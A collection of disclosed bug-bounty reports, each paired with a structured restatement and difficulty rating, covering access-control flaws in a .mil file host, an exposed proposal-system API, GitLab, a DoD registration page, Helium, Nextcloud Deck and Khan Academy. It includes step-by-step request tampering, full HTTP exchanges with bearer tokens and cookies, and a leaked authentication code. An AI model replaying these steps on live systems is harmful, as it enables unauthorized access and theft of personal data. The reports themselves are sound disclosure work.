Step-by-step Reproduction Instructions
Navigate to: https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT
Create sub-directory
Upload test files
Files are then uploaded and hosted on a .mil website without authenticating to the application.
Product, Version, and Configuration (If applicable)
FileCloud software
https://www.getfilecloud.com/
## Suggested Mitigation/Remediation Actions
Enforce authentication on endpoints of the application, restrict file uploads to only necessary business requirements. If possible restrict uploads to .jpg .pfd .docx. Don't allowed upload of executable files
Impact
An attacker can attempt to use the site to host malware, or perform social engineering attacks since the domain URL will be a .mil address.



================================================================================
Vulnerability Description:
The endpoint at https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT allowed for read and write access without authentication, enabling the creation of directories and uploading of files, including executable files. This could be exploited to host malware or perform social engineering attacks.

Steps to Reproduce:
1. Navigate to: https://████/ui/core/index.html?mode=public#expl-tabl./SHARED/rpchllmd/CSAT
2. Create sub-directory and upload test files (including executable files like putty.exe)
Exploitation Difficulty:
The vulnerability involves a straightforward bypass of authentication by appending a specific parameter (?mode=public) to the URL. The attack does not require multiple components, complex interactions, or manipulation of application states. The ability to upload arbitrary files, including executables, is a common and well-documented vulnerability.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/745171: Unprotected ██████ and Test site API Exposes Documents, Credentials, and Emails in ██████████ Proposal System
================================================================================
RAW DESCRIPTION:

Summary:
The test/integration API of the █████ web services is publicly exposed: disclosing documents, emails, and credentials to what appears to be the Seaport Bid proposal system. Because I did not attempt any exploitation outside of that necessary to deem this a reportable issue, it is not clear if the data is only test generated or if the system contains production documents, credentials, etc.
███████
Description:
While performing manual reconnaissance, I came across Swagger/API documentation for the ███ web services API at https://███████/.
The API endpoint appears to have four main types of functionality:
1) Document storage/retrieval
2) Email template storage
3) Email generation
4) PDF generation
Due to the lack of authentication on the API, the system can be easily abused by a minimally sophisticated attacker.
Impact & Steps to Reproduce
1) Documents stored in the system can be uploaded, modified, or deleted via the API. Per the DoD program rules on data exfil, I did not try to access the documents. You can view a listing of the documents here:
https://███/api/1_0/Documents
2) Email templates can be access and modified. For example, you can view all email templates here:
https://██████████/api/1_0/EmailTemplates
You can also add, modify, or delete templates via the API.
3) Most importantly, you can view all of the emails that the system has sent via the API. The exact route is:
https://████/api/1_0/EmailMessages
The emails are highly sensitive because they contain the activation codes needed to create a new account and access the █████████ Proposal System at https://███/Bid/.
For example, one of the last emails sent includes the following:
Code 622 Bytes
1
2{"resultmetadata":[{"emailId":"3f6f7fb7-167b-432d-b35b-f443709ba832","systemcode":null,"senderEmailAddress":"████ Admin<DoNotReply@█████.com>","acknowledgementRequested":false,"attachments":[],"tags":[],"tokens":null,"emailStatus":"Sent","Subject":"Your ███████ Authentication Code","Body":"Your authentication code is 373A51. This code will expire at 09:23 AM on 11/22/2019.\r\n\r\n-----------------------------------------------------------------\r\n\r\nYou may check in through the following link https://████/Bid.\r\n\r\nThank you for your business with ███████.\r\n\r\nPlease do not reply directly to this message. 
3
Note the █████ Authentication Code 373A51, which would allow an attacker to login to the system at https://█████/Bid.
The emails also include usernames of current users in the system who will have access expiring in the near future:
█████
You can view the full list of emails here:
https://█████████/api/1_0/EmailMessages
Suggested Mitigation/Remediation Actions
Utilize bearer token authentication on the API route so that unauthorized parties cannot query it. Alternatively, lock down access to the API endpoint to restricted IP addresses or networks so that it is no longer publicly accessible.
Impact
Upload, delete, or download sensitive files stored in the document DB
Send, read, and modify emails from ████ admin
Login to ████ proposal system using stolen authentication codes sent to users



================================================================================
Vulnerability Description:
The test/integration API of the █████ web services is publicly exposed without authentication, disclosing sensitive documents, emails, and credentials related to the Seaport Bid proposal system. This allows unauthorized access to document storage, email templates, and sent emails, including authentication codes for system access.

Steps to Reproduce:
1. Navigate to the exposed Swagger/API documentation at https://███████/
2. Access various unprotected API endpoints such as https://███/api/1_0/Documents, https://██████████/api/1_0/EmailTemplates, and https://████/api/1_0/EmailMessages to view, modify, or delete sensitive data
Exploitation Difficulty:
The vulnerability was discovered through manual reconnaissance of publicly accessible API documentation. The lack of authentication makes the API endpoints easily accessible without requiring complex exploitation techniques or deep understanding of the system's internal workings.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/790786: Members from parent group keep their access level on a subgroup transfer and are invisible
================================================================================
RAW DESCRIPTION:

Summary
There's an option that allows to transfer groups from one namespace to another, it doesn't work as intended when transferring subgroups from inside a parent group to another group. Users that were part of the first parent group from where the subgroup has been transfered, keep their permissions and access level on the subgroup, wherever it was transfered and without being explicit members of the subgroup.
Not only that, they don't appear as members. They have access without appearing on the members tab. They also get some sort of access to the new parent group where the subgroup has been transfered, without being members of that new group even when it's private.
Steps to reproduce
Create 2 different private groups (so you can instantly see when you get a 404 no access). GroupA, and GroupB.
Invite to some members to GroupA and give them maintainer/owner(for testing high privileges) access.
Don't invite anyone except yourself to groupB (this makes testing easier).
Create a subgroup in groupA, subgroupA
Create a project in subgroupA, project-test.
Now, you'll see that members from groupA have access to both subgroupA and project-test, as they are members of the main group groupA.
Transfer subgroupA to groupB.
Recheck with a user that's not a member of groupB and you'll see he keeps his permission on the transferred subgroup and it's related projects.
Also check the members tab and you'll see they don't appear there, and they have permissions to see and if they where owner/maintainer on the previous main group, they have access to settings and that sort of things.
Impact
It affects all the transferred subgroups and their projects if those were transferred from a main group to another group. Members from that main group are still ghost members and can still access and modify those groups.
Not sure how much of the users have transferred groups to other groups, but it could be a lot.
Examples
I've made 2 private projects for the tests, I'm making them public but you'll not be able to see the members directly, as one of the members doesn't even appear on the members tab.
Group1 (Added 2 users as members):
https://gitlab.com/groups/main_group1
Group2 (Only cristian.berner is a member of this group):
https://gitlab.com/groups/main_group2
From Group1 I created and transfered subgroup1 with an inner project called project3 to Group2:
https://gitlab.com/main_group1/subgroup1/project3 (This would redirect to https://gitlab.com/main_group2/subgroup1/project3 as it was transferred there)
Now look at members from subgroup1 and members of project3, there's no @kryword in there, still I have full access with that account there to remove/add members or even delete the project.
I attached two screenshots showing this.
What is the current bug behavior?
Members from parent group are also transferred as ghost members(they're not showing in members menu) when a subgroup with projects is transferred to another group.
What is the expected correct behavior?
Members from parent group should not be transferred or if the intended behaviour is that they also get transfered, they should show up in the members menu.
Output of checks
This bug happens on GitLab.com
Impact
Members that have been part of a parent group when a transfer happened, they have the same privileges that they had on those subgroups transferred and if they were owners for that moment, they are still owners and not even showing as members on those transfered subgroups/projects.



================================================================================
Vulnerability Description:
When transferring a subgroup from one parent group to another, members of the original parent group retain their access levels on the transferred subgroup and its projects without being listed in the members tab. This allows them to continue accessing and modifying the subgroup and its projects even after the transfer.

Steps to Reproduce:
1. Create two private groups (GroupA and GroupB) and invite members to GroupA with maintainer/owner access.
2. Create a subgroup (subgroupA) in GroupA and a project (project-test) within subgroupA.
3. Transfer subgroupA to GroupB and verify that members from GroupA retain access to subgroupA and project-test without appearing in the members tab.
Exploitation Difficulty:
The vulnerability involves understanding group and subgroup hierarchies, transfer operations, and membership inheritance. The interaction between these components is subtle, as the retained access is not immediately obvious and requires specific steps to reproduce.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/796379: [Critical] Insufficient Access Control On Registration Page of Webapps Website Allows Privilege Escalation to Administrator 
================================================================================
RAW DESCRIPTION:

Summary:
Hello.
Due to insufficient access controls and poor implementation of the registration at https://████████/████/login.cfm it was possible to register while privilege escalating to an administrator.
Description:
It was possible to tamper with the registration request at https://█████████/██████/screen_questions.cfm which is aimed to ███████ applications for education in order to sign-up with administrator privileges. As a result, it was possible to gain access to personally identifiable information (PII) of all the applicants in the system, including SSNs, names, phones and emails.
At this point I stopped digging further and I started writing this report.
Note: Please can you liaise with the system's administrator and kindly ask them to remove the below accounts from the system after this has been triaged and resolved:
Code 61 Bytes
1██████
2█████████
3███
4█████████
5██████
6███
7█████████
8█████████
Apologies for creating all these accounts, most of them are just low privileged applicants, but I was confused as to why this attack worked and it took few attempts to figure it out.
Please let me know when this is resolved and I will remove any evidence that include PII data from my local system which are only kept locally.
Impact
An attacker can gain administrative access in the system allowing them to expose sensitive PII information, such as including SSNs, names, phones and emails. Having this access, an attacker could completely take over the website and perform further attacks against it from this authenticated viewpoint - however I did not perform this. Attackers may sell this PII information on black-markets for profit.
If this was exploited and published there would be severe reputational and legal ramifications for DoD.
Step-by-step Reproduction Instructions
Initially, enable your web intercepting proxy such as Burp Suite
Next, browse to the initial registration page at: https://████/████████/screen_questions.cfm and choose options in the dropdown lists: █████████
Next, you will be taken at the actual registration page at https://████/████████/newuser.cfm?loc_class=L (you can probably skip step 2 and come right here)
Fill in this form with some information and a legitimate looking SSN number. Keep in mind that if the SSN is registered in the system, the website will error, so you will have to try another one.
Intercept the request and modify it so that the user_type parameter has value 4, and the fname and lname parameters have values Hackerone<% and test<%xss. I believe it is <% that is causing this privilege escalate issue, but as I am not 100% positive I am giving you the full values. The request should look like mine: █████
If all went well, you should be logged in and prompted with a Privacy page which you need to accept.
Notice how this account has administrator access, an example is shown below: █████████
Finally, I created 2 short PoC videos showing how I was able to register as admin and how I was able to access PII data:
Create admin account video: ██████
Access PII data video: {F716040}
Product, Version, and Configuration (If applicable)
The https://█████████ website is under █████████ which is part of DoD, as shown: █████████
Suggested Mitigation/Remediation Actions
Unfortunately, I am not 100% positive on what exactly is causing this flaw, but injection of <% is required. This could be mitigated by applying strict user input validation in the fname and lname fields. Please see the link below for more information:
https://owasp.org/www-project-cheat-sheets/cheatsheets/Input_Validation_Cheat_Sheet
I would also recommend that you review the current user access types and levels in accordance with the findings above to ensure that setting the user_type to other numbers than the default one when registering (5) does not allow users to gain more privileges than they are authorized to.
Additionally, review the whole codebase for broken access control, the following cheatsheet from OWASP provides more information:
https://owasp.org/www-project-cheat-sheets/cheatsheets/Access_Control_Cheat_Sheet
Finally, the web application appears to be very susceptible to common web application attacks and I would recommend that this undertakes a full thorough security test if possible or a code review, if of course it is required and cannot be decommissioned.
PS: I will do my best to submit reports in terms of the rest of flaws I was able to spot while looking at it.
Impact
An attacker can gain administrative access in the system allowing them to expose sensitive PII information, such as including SSNs, names, phones and emails. Having this access, an attacker could completely take over the website and perform further attacks against it from this authenticated viewpoint - however I did not perform this. Attackers may sell this PII information on black-markets for profit.
If this was exploited and published there would be severe reputational and legal ramifications for DoD.



================================================================================
Vulnerability Description:
Insufficient access control on the registration page allows privilege escalation to administrator by tampering with the registration request, specifically by injecting '<%' into the fname and lname fields and modifying the user_type parameter. This grants unauthorized access to sensitive PII data.

Steps to Reproduce:
1. Enable a web intercepting proxy like Burp Suite.
2. Browse to the registration page at https://████/████████/screen_questions.cfm and select options in the dropdown lists.
3. Proceed to the registration form at https://████/████████/newuser.cfm?loc_class=L.
4. Fill in the form with legitimate-looking information, including a unique SSN.
5. Intercept the request and modify the user_type parameter to 4, and the fname and lname parameters to include '<%'.
6. Submit the modified request to register with administrator privileges.
7. Accept the Privacy page prompt upon successful login.
8. Verify administrative access by checking for access to PII data.
Exploitation Difficulty:
The attack involves manipulating the registration request in a non-obvious way (injecting '<%' and changing user_type) to escalate privileges. While the steps are straightforward, the need to discover the specific injection and parameter manipulation adds complexity.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/809816: Organization Takeover
================================================================================
RAW DESCRIPTION:

Hello @helium,
The console.helium.com application doesn't correctly manage the /membership/ resources and allows a user to privilege escalate an organization of which he's part of just modifying it's role.
Steps to reproduce the bug
1) Let's make two user accounts:
azraelsec@wearehackerone.com [A]
███ [B] (this is actually my personal account and can be deleted)
Initial Context: azraelsec is Administrator of the hackerone organization while federicogerardi94 is Administrator of the testhackerone organization.
Goal: azraelsec becomes Administrator of testhackerone.
2) [B] invites [A] to take part in his testhackerone organization with the role of Manager
3) [A] switches to testhackerone organization and makes a graphql query to leak his Manager membership's id (using graphql it's only possible to see the memberships of the current organization):
Code 2.14 KiB
1POST /graphql HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 488
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxMTQ0LCJpYXQiOjE1ODMyNTQ3NDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiIzNzQ4ZmJkYS1iMjhiLTRlOWYtOThiMy00ZTUzMGRlYWEwNmMiLCJuYmYiOjE1ODMyNTQ3NDMsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.-1VwG72225yPkZ0BimNSw_DFURRlT8Wh-AcAuDXgJFEEfiPduEdWcwwxY6-oQEHx8ILFUlxQYdbduYiTA-D79Q
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTQ3NDg0OTgsImV2ZW50SWQiOjE5MywiaWRlbnRpZnlJZCI6NDEsInNlcXVlbmNlTnVtYmVyIjoyMzR9
17
18{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
Code 757 Bytes
1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 514
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 16:59:27 GMT
7Server: Cowboy
8Strict-Transport-Security: max-age=31536000
9Via: 1.1 vegur
10
11{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"manager","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
NOTE: [A] is a member of testhackerone with the role of Manager using the membership id bc96332e-c6b4-4728-b35e-8145eea0996a
3) [A] switches back to his hackerone organization (this will provide him a new full-privileged token) and sends a PUT request on the /membership/ resource pointing out the membership's id leaked before, changing his role to admin:
Code 1.73 KiB
1PUT /api/memberships/bc96332e-c6b4-4728-b35e-8145eea0996a HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 31
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQxNTA0LCJpYXQiOjE1ODMyNTUxMDQsImlzcyI6ImNvbnNvbGUiLCJqdGkiOiJkODIxNzAwYS0xMGE5LTQwOGItYjc3ZC01OGY5ODY2ZWFkZmUiLCJuYmYiOjE1ODMyNTUxMDMsIm9yZ2FuaXphdGlvbiI6IjZjNmM4YzhhLTQ5ZmUtNGJlZi1hMDBjLWZkOTliZWUzOWIwZCIsIm9yZ2FuaXphdGlvbl9uYW1lIjoiaGFja2Vyb25lIiwic3ViIjoiNTU5NDZkMGUtMGE5MC00ZDRkLTlkYjgtMTIyMzYyZjU3NzU2IiwidHlwIjoiYWNjZXNzIn0.r13Aj4TXYzLYJ7clq9gl_SbpdSnVZpUsj0rFtgIMMeUXAE-44iiReL8bffEy4414L6Ess-dOH5L7MFiT55GAqw
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTEwNzEwNDEsImV2ZW50SWQiOjEzOSwiaWRlbnRpZnlJZCI6MjksInNlcXVlbmNlTnVtYmVyIjoxNjh9
17
18{"membership":{"role":"admin"}}
Since the back-end only checks if the requesting account has is an admin in its actual organization' scope but not if the membership that he's modifying is related to this, the request works, allowing [A] to becoming Administrator of hackeronetest organization:
Code 456 Bytes
1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 154
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 17:10:01 GMT
7Message: User role updated successfully
8Server: Cowboy
9Strict-Transport-Security: max-age=31536000
10Via: 1.1 vegur
11
12{"email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","joined_at":"2020-03-03T16:42:49","role":"admin","type":"memberships"}
NOTE: [A] has to be sure not to switch to testhackerone!! To exploit the vulnerability [A] needs to remain inside the organization of which he is Administrator (a POST call to /api/organizations/6c6c8c8a-49fe-4bef-a00c-fd99bee39b0d/switch will invalidate the Bearer token and provide a new one that has the correct privileges).
4) Now [A] can switch again organization to hackeronetest and administrate it as Administrator:
Code 2.14 KiB
1POST /graphql HTTP/1.1
2Host: console.helium.com
3Connection: close
4Content-Length: 488
5accept: */*
6Sec-Fetch-Dest: empty
7authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJjb25zb2xlIiwiZXhwIjoxNTgzMzQyMDk5LCJpYXQiOjE1ODMyNTU2OTksImlzcyI6ImNvbnNvbGUiLCJqdGkiOiI0YWM5ZDk2OC1hMGYwLTQ5MDgtODZmMi0wNTE3ZjE3OTE0NjMiLCJuYmYiOjE1ODMyNTU2OTgsIm9yZ2FuaXphdGlvbiI6IjkxNmE3NmJmLWM3ZmEtNDkxYi1hZjAyLTY3NGY5YWYwZTFhMyIsIm9yZ2FuaXphdGlvbl9uYW1lIjoidGVzdGhhY2tlcm9uZSIsInN1YiI6IjU1OTQ2ZDBlLTBhOTAtNGQ0ZC05ZGI4LTEyMjM2MmY1Nzc1NiIsInR5cCI6ImFjY2VzcyJ9.rShCG6pW0Pjkd_dd8KTslyKPU38jrzhMrn39dkxdIqhePsCFx4FsEmNSKXTNm2zD02dPZNkp_N_FGtcen8kaeQ
8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.122 Safari/537.36
9content-type: application/json
10Origin: https://console.helium.com
11Sec-Fetch-Site: same-origin
12Sec-Fetch-Mode: cors
13Referer: https://console.helium.com/users
14Accept-Encoding: gzip, deflate
15Accept-Language: it-IT,it;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6
16Cookie: _ga=GA1.2.356414044.1583245182; _gid=GA1.2.514054915.1583245182; ajs_anonymous_id=%22b4ba3101-c694-4846-baa8-7c8327764369%22; ajs_group_id=null; ajs_user_id=1; intercom-id-ghj6l8hv=253a4abc-6b70-4491-9b80-b8b69c070546; intercom-session-ghj6l8hv=; _console_key=SFMyNTY.g3QAAAAA.vg9m7JVv2pR0cST_2fykHvzkeAyEyq8PdhkZ0fBMMiM; amplitude_id_2b23c37c10c54590bf3f2ba705df0be6helium.com=eyJkZXZpY2VJZCI6IjI4OGY3ZTJiLTRjNTgtNDEyOC1hNWUwLTliYjY0OTRkMzU2N1IiLCJ1c2VySWQiOiI1NTk0NmQwZS0wYTkwLTRkNGQtOWRiOC0xMjIzNjJmNTc3NTYiLCJvcHRPdXQiOmZhbHNlLCJzZXNzaW9uSWQiOjE1ODMyNDYzMzc1MzksImxhc3RFdmVudFRpbWUiOjE1ODMyNTU3MDI0MTAsImV2ZW50SWQiOjIwMywiaWRlbnRpZnlJZCI6NDMsInNlcXVlbmNlTnVtYmVyIjoyNDZ9
17
18{"operationName":"PaginatedMembershipsQuery","variables":{"page":1,"pageSize":10},"query":"query PaginatedMembershipsQuery($page: Int, $pageSize: Int) {\n  memberships(page: $page, pageSize: $pageSize) {\n    entries {\n      ...MembershipFragment\n      __typename\n    }\n    totalEntries\n    totalPages\n    pageSize\n    pageNumber\n    __typename\n  }\n}\n\nfragment MembershipFragment on Membership {\n  id\n  email\n  role\n  inserted_at\n  two_factor_enabled\n  __typename\n}\n"}
Code 756 Bytes
1HTTP/1.1 200 OK
2Connection: close
3Cache-Control: max-age=0, private, must-revalidate
4Content-Length: 512
5Content-Type: application/json; charset=utf-8
6Date: Tue, 03 Mar 2020 17:17:12 GMT
7Server: Cowboy
8Strict-Transport-Security: max-age=31536000
9Via: 1.1 vegur
10
11{"data":{"memberships":{"__typename":"PaginatedMemberships","entries":[{"__typename":"Membership","email":"█████████","id":"512c8188-7008-49ce-a140-3538696e8c2c","inserted_at":"2020-03-03T16:09:37","role":"admin","two_factor_enabled":false},{"__typename":"Membership","email":"azraelsec@wearehackerone.com","id":"bc96332e-c6b4-4728-b35e-8145eea0996a","inserted_at":"2020-03-03T16:42:49","role":"admin","two_factor_enabled":false}],"pageNumber":1,"pageSize":10,"totalEntries":2,"totalPages":1}}}
Impact
This vulnerability lets a user with low privileges to escalate and to become Administrator of an Organization of which was a simple Manager, deleting the original Administrator and to full control it



================================================================================
Vulnerability Description:
The vulnerability allows a user to escalate their privileges from Manager to Administrator in an organization they are part of by exploiting improper role management in the /membership/ resource. The backend only checks if the requesting user is an Admin in their current organization but does not verify if the membership being modified belongs to that organization.

Steps to Reproduce:
1. Create two user accounts: one as an Administrator of an organization (User A) and another as an Administrator of a different organization (User B).
2. User B invites User A to their organization with a Manager role.
3. User A switches to User B's organization and uses GraphQL to leak their Manager membership ID.
4. User A switches back to their original organization and sends a PUT request to modify their role in User B's organization to Admin using the leaked membership ID.
5. User A switches to User B's organization and confirms they now have Admin privileges.
Exploitation Difficulty:
The attack involves multiple steps, including switching between organizations, leaking membership IDs via GraphQL, and manipulating role permissions. The interaction between these steps is subtle and requires understanding the application's state management and token handling. The logic flaw in role verification is non-obvious and not commonly found in other applications.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/827816: Missing server side controls when editing the board’s sharing permissions per user
================================================================================
RAW DESCRIPTION:

Author: Silvia Väli, Clarified Security (https://www.clarifiedsecurity.com/silvia-vali/)
Date: 24th of March, 2020
Description:
When the regular user is visiting the Deck view, all created boards are displayed along with the ones that are shared with the user by others. Available functionality within each of the shared boards depends whether the user has received share, manage, edit permissions.
Since the access control rules related to user’s permissions have only been applied on the client side and not on the server side, user can specify share/edit/manage permissions to be always true within the response (for example by using a proxy tool) when viewing board information. This way he can gain control over the board so he/she could apply the missing edit/manage permissions to him/herself directly from the UI.
Version information:
Nextcloud 18.0.2
Deck 0.8.0 enabled
Pre-requisites as an admin user to follow the vulnerable path:
create 2 regular users in the next cloud, for example user silvia and user john. Users do not belong to the admin group.
Install the Deck app (installed version 0.8.0)
To reproduce the vulnerable path:
User: silvia
Authenticate as user silvia and select Deck from the menu
Create new board -> name it (“board for testing”)
Add a new stack (“test test”)
Click on “Show board for details”
Add the other user john and only give him Share permission. Uncheck Edit and Manage.
User: john
Now authenticate in the application as john -> click Deck from the menu and open the shared board “board for testing”. Since the board was only Shared and no edit permissions were granted, john cannot do much on the board.
What john can do however is use a proxy tool such as Burp Suite to modify the response body. When john clicks on the Deck from the menu, following request is made:
Code 79 Bytes
1GET /apps/deck/boards HTTP/1.1
2Host: next.yy.ee
3...
4Connection: close
5Cookie: …
In the response to that request, you can see that john only been given the permission to share which only allows to read the data and not modify it.
Code 535 Bytes
1[{"title":"board for testing",
2"owner":{"primaryKey":"silvia","uid":"silvia","displayname":"silvia"},"color":"0082c9","archived":false,"labels":[],"acl":[{"participant":{"primaryKey":"john","uid":"john","displayname":"john"},"type":0,"boardId":7,"permissionEdit":false,"permissionShare":true,"permissionManage":false,"owner":false,"id":4}],"permissions":{"PERMISSION_READ":true,"PERMISSION_EDIT":false,"PERMISSION_MANAGE":false,"PERMISSION_SHARE":true},"users":[],"shared":1,"stacks":[],"deletedAt":0,"lastModified":1585045324,"id":7}]
john however uses a proxy tool such as Burp Suite and applies via proxy -> options -> Match and replace that every time the following line with permissions is seen modify all the options to be equal to true.
Original: "permissionEdit":false,"permissionShare":true,"permissionManage":false,"owner":false
Modified: "permissionEdit":true,"permissionShare":true,"permissionManage":true,"owner":true
If john now refreshes the Deck page and opens the board “board for testing” -> Show board details -> Sharing -> he can add himself the permissions to Edit, Share, Manage to take over the board which was initially only shared with him.
Impact
Attacker would achieve control over the board and its data/attachment uploads etc.



================================================================================
Vulnerability Description:
The vulnerability allows a user to escalate their permissions on a shared board in Nextcloud Deck by manipulating client-side responses, bypassing server-side access controls. This occurs because the application only enforces permissions on the client side, enabling an attacker to modify these permissions via a proxy tool.

Steps to Reproduce:
1. User silvia creates a board in Nextcloud Deck and shares it with user john, granting only Share permission.
2. User john uses a proxy tool (e.g., Burp Suite) to modify the response, changing permissions to grant himself Edit, Share, and Manage access.
3. User john refreshes the page and uses the UI to take full control of the board.
Exploitation Difficulty:
The attack involves understanding the permission structure and using a proxy tool to manipulate responses, but the core flaw (lack of server-side validation) is a common and well-known issue in web applications. The steps are straightforward once the proxy tool is set up.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/868146: Unauthorised Account Detail Modification 
================================================================================
RAW DESCRIPTION:

Introduction
Hi 5kyw41k3r here,
I found an Unauthorised Account Detail Modification in KA website...
Defination
Code 166 Bytes
1It is a flaw which allows a malicious actor to modify the details of an account. I have included a video made by me for demonstration purposes using a test account...
Reproduction Steps:-
============
==I have included a video in the attachments
You need burp proxy correctly configured and working properly.
Go to settings and make minor changes to your account.
Hit save and then intercept that request.
Disconnect your browser and your proxy
Send the Step 3 request to the repeater and forward all unnecessary requests.
Modify the request as shown in the video There you have it! Notice how you can change you nickname and DOB which is actually not authorized in the browser itself.
Here's the vid=====> ████████
Impact
Impact
Well, khan academy being used in schools like mine as it says on the page;
This is because Khan Academy is used in many schools...
Anyone can change these details by getting hold of those requests, which you can do through the inspect element...No rocket science!
This can lead to a lot of issues such as leakage of sensitive data(Such as parent emails and accounts)
They could also perform identity theft through this method.
I strongly recommend to fix this as soon as possible.
Hoping for swag!
Thanks and Stay Safe at Home,
5kyw41k3r



================================================================================
Vulnerability Description:
This vulnerability allows an attacker to modify unauthorized account details (such as nickname and date of birth) by intercepting and manipulating the request sent to the server, bypassing client-side restrictions.

Steps to Reproduce:
1. Configure Burp proxy and ensure it is working properly.
2. Navigate to the settings page of the KA website and make minor changes to your account details.
3. Intercept the save request using Burp proxy.
4. Disconnect the browser and proxy, then send the intercepted request to Burp Repeater.
5. Modify the request to change unauthorized fields like nickname and date of birth.
6. Forward the modified request to observe the unauthorized changes.
Exploitation Difficulty:
The attack involves using a proxy to intercept and modify requests, which is a common technique in web security testing. The steps are straightforward and do not require deep understanding of complex application states or novel logic.

--------------------------------------------------------------------------------

Report https://hackerone.com/reports/869450: Support incident can be opened for any user via /███████ and PII leak via █████████ field
================================================================================
RAW DESCRIPTION:

Summary:
A malicious user can open an incident for any user via the ████/████████ page. This would allow the attacker to trick the victim into taking actions such as clicking a link or opening a file that has been attached to the incident.
Impact
